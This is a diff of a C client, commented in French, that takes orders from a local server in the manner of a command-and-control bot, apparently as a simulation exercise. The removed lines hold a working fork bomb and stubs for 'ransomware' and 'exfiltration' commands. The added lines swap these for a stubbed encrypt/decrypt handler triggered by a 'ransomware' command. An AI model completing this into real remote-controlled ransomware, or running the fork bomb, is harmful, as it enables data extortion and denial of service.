@@ -8,25 +8,14 @@
 #define SERVER_IP "127.0.0.1"
 #define PORT 12345
 
-// Fonction pour chiffrer un fichier (simulation ransomware)
-void encrypt_files() {
-    printf("Encrypting files with ransomware...\n");
-    // Implémentez la logique pour chiffrer les fichiers ici
-    // Par exemple, renommer les fichiers et ajouter la signature.
-}
-
-// Fonction pour simuler l'exfiltration de fichiers
-void exfiltrate_data() {
-    printf("Exfiltrating data...\n");
-    // Implémentez la logique pour exfiltrer les fichiers ici
-    // Par exemple, envoyer le contenu d'un fichier au serveur.
-}
-
-// Fonction pour simuler l'exécution d'un fork
-void handle_fork() {
-    printf("Handling fork...\n");
-    while (1) {
-        fork();  // Crée un fork pour surcharger le système
+// Simule le chiffrement ou déchiffrement d'un fichier
+void process_file(const char *action) {
+    if (strcmp(action, "chiffrer") == 0) {
+        printf("Encrypting file...\n");
+        // Ajoutez ici votre logique de chiffrement
+    } else if (strcmp(action, "dechiffrer") == 0) {
+        printf("Decrypting file...\n");
+        // Ajoutez ici votre logique de déchiffrement
     }
 }
 
@@ -57,29 +46,35 @@ int main() {
         return -1;
     }
 
-    // Envoie de l'identifiant au serveur
+    // Envoi de l'identifiant au serveur
     printf("Enter your client ID: ");
     fgets(client_id, sizeof(client_id), stdin);
-    client_id[strcspn(client_id, "\n")] = '\0';  // Supprime le '\n' à la fin
+    client_id[strcspn(client_id, "\n")] = '\0'; // Supprime le '\n' à la fin
     send(sock, client_id, strlen(client_id), 0);
 
     while (1) {
         // Lecture de l'ordre du serveur
+        memset(buffer, 0, sizeof(buffer));
         read(sock, buffer, sizeof(buffer));
         printf("Received command: %s\n", buffer);
- 
+
         if (strcmp(buffer, "ransomware") == 0) {
-            encrypt_files();
-        } else if (strcmp(buffer, "exfiltration") == 0) {
-            exfiltrate_data();
-        } else if (strcmp(buffer, "fork") == 0) {
-            handle_fork();
+            // Lire l'action à effectuer (chiffrer ou déchiffrer)
+            memset(buffer, 0, sizeof(buffer));
+            read(sock, buffer, sizeof(buffer));
+            printf("Action to perform: %s\n", buffer);
+
+            // Exécuter l'action demandée
+            process_file(buffer);
+
+            // Envoyer une réponse au serveur
+            send(sock, "Action completed", 17, 0);
         } else if (strcmp(buffer, "out") == 0) {
             printf("Disconnected from server.\n");
             break;
         }
     }
- 
+
     close(sock);
     return 0;
 }
